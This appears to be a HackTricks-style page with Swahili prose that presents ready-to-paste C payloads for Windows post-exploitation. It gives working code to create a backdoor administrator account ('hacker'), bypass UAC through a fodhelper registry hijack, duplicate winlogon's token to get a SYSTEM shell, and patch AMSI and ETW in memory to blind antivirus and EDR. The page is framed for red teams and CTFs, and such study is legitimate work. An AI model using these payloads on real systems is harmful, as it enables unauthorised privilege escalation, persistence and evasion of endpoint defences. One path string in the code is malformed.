# Windows C Payloads

{{#include ../../banners/hacktricks-training.md}}

Ukurasa huu unakusanya **vipande vidogo vya C vilivyojitegemea** ambavyo ni vya manufaa wakati wa Windows Local Privilege Escalation au baada ya unyakuzi. Kila payload imeundwa kuwa **rafiki kwa nakala-na-kupaste**, inahitaji tu Windows API / C runtime, na inaweza kukusanywa kwa `i686-w64-mingw32-gcc` (x86) au `x86_64-w64-mingw32-gcc` (x64).

> ⚠️  Payload hizi zinadhani kwamba mchakato tayari una ruhusa za chini zinazohitajika kutekeleza kitendo (mfano `SeDebugPrivilege`, `SeImpersonatePrivilege`, au muktadha wa kati wa uaminifu kwa bypass ya UAC). Zimekusudiwa kwa **red-team au mazingira ya CTF** ambapo kutumia udhaifu kumepata utekelezaji wa msimbo wa asili usio na mipaka.

---

## Ongeza mtumiaji wa msimamizi wa ndani
```c
// i686-w64-mingw32-gcc -s -O2 -o addadmin.exe addadmin.c
#include <stdlib.h>
int main(void) {
system("net user hacker Hacker123! /add");
system("net localgroup administrators hacker /add");
return 0;
}
```
---

## UAC Bypass – `fodhelper.exe` Registry Hijack (Medium → High integrity)
Wakati faili la kuaminika **`fodhelper.exe`** linatekelezwa, linauliza njia ya rejista hapa chini **bila kuchuja neno la `DelegateExecute`**. Kwa kupanda amri yetu chini ya ufunguo huo, mshambuliaji anaweza kupita UAC *bila* kuweka faili kwenye diski.

*Registry path queried by `fodhelper.exe`*
```
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
PoC ndogo inayofungua `cmd.exe` iliyo na haki za juu:
```c
// x86_64-w64-mingw32-gcc -municode -s -O2 -o uac_fodhelper.exe uac_fodhelper.c
#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

int main(void) {
HKEY hKey;
const char *payload = "C:\\Windows\\System32\\cmd.exe"; // change to arbitrary command

// 1. Create the vulnerable registry key
if (RegCreateKeyExA(HKEY_CURRENT_USER,
"Software\\Classes\\ms-settings\\Shell\\Open\\command", 0, NULL, 0,
KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {

// 2. Set default value => our payload
RegSetValueExA(hKey, NULL, 0, REG_SZ,
(const BYTE*)payload, (DWORD)strlen(payload) + 1);

// 3. Empty "DelegateExecute" value = trigger (")
RegSetValueExA(hKey, "DelegateExecute", 0, REG_SZ,
(const BYTE*)"", 1);

RegCloseKey(hKey);

// 4. Launch auto-elevated binary
system("fodhelper.exe");
}
return 0;
}
```
*Imepimwa kwenye Windows 10 22H2 na Windows 11 23H2 (pachiko za Julai 2025). Njia ya kupita bado inafanya kazi kwa sababu Microsoft haijarekebisha ukosefu wa ukaguzi wa uaminifu katika njia ya `DelegateExecute`.*

---

## Kuanzisha shell ya SYSTEM kupitia nakala ya tokeni (`SeDebugPrivilege` + `SeImpersonatePrivilege`)
Ikiwa mchakato wa sasa una **zote** `SeDebug` na `SeImpersonate` ruhusa (ya kawaida kwa akaunti nyingi za huduma), unaweza kuiba tokeni kutoka `winlogon.exe`, kuiga, na kuanzisha mchakato wa juu:
```c
// x86_64-w64-mingw32-gcc -O2 -o system_shell.exe system_shell.c -ladvapi32 -luser32
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

DWORD FindPid(const wchar_t *name) {
PROCESSENTRY32W pe = { .dwSize = sizeof(pe) };
HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
if (snap == INVALID_HANDLE_VALUE) return 0;
if (!Process32FirstW(snap, &pe)) return 0;
do {
if (!_wcsicmp(pe.szExeFile, name)) {
DWORD pid = pe.th32ProcessID;
CloseHandle(snap);
return pid;
}
} while (Process32NextW(snap, &pe));
CloseHandle(snap);
return 0;
}

int wmain(void) {
DWORD pid = FindPid(L"winlogon.exe");
if (!pid) return 1;

HANDLE hProc   = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
HANDLE hToken  = NULL, dupToken = NULL;

if (OpenProcessToken(hProc, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &hToken) &&
DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &dupToken)) {

STARTUPINFOW si = { .cb = sizeof(si) };
PROCESS_INFORMATION pi = { 0 };
if (CreateProcessWithTokenW(dupToken, LOGON_WITH_PROFILE,
L"C\\\Windows\\\System32\\\cmd.exe", NULL, CREATE_NEW_CONSOLE,
NULL, NULL, &si, &pi)) {
CloseHandle(pi.hProcess);
CloseHandle(pi.hThread);
}
}
if (hProc) CloseHandle(hProc);
if (hToken) CloseHandle(hToken);
if (dupToken) CloseHandle(dupToken);
return 0;
}
```
Kwa maelezo ya kina kuhusu jinsi hiyo inavyofanya kazi ona:
{{#ref}}
sedebug-+-seimpersonate-copy-token.md
{{#endref}}

---

## Patching ya AMSI & ETW Katika Kumbukumbu (Kuepuka Ulinzi)
Mifumo mingi ya kisasa ya AV/EDR inategemea **AMSI** na **ETW** kuchunguza tabia mbaya. Kuweka patch kwenye interfaces zote mbili mapema ndani ya mchakato wa sasa kunazuia payloads za msingi wa script (k.m. PowerShell, JScript) ziskenwe.
```c
// gcc -o patch_amsi.exe patch_amsi.c -lntdll
#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <stdio.h>

void Patch(BYTE *address) {
DWORD oldProt;
// mov eax, 0x80070057 ; ret  (AMSI_RESULT_E_INVALIDARG)
BYTE patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
VirtualProtect(address, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProt);
memcpy(address, patch, sizeof(patch));
VirtualProtect(address, sizeof(patch), oldProt, &oldProt);
}

int main(void) {
HMODULE amsi  = LoadLibraryA("amsi.dll");
HMODULE ntdll = GetModuleHandleA("ntdll.dll");

if (amsi)  Patch((BYTE*)GetProcAddress(amsi,  "AmsiScanBuffer"));
if (ntdll) Patch((BYTE*)GetProcAddress(ntdll, "EtwEventWrite"));

MessageBoxA(NULL, "AMSI & ETW patched!", "OK", MB_OK);
return 0;
}
```
*Patches hapo juu ni za mchakato wa ndani; kuanzisha PowerShell mpya baada ya kuikimbia itatekelezwa bila ukaguzi wa AMSI/ETW.*

---

## Marejeo
* Ron Bowes – “Fodhelper UAC Bypass Deep Dive” (2024)
* SplinterCode – “AMSI Bypass 2023: The Smallest Patch Is Still Enough” (BlackHat Asia 2023)

{{#include ../../banners/hacktricks-training.md}}
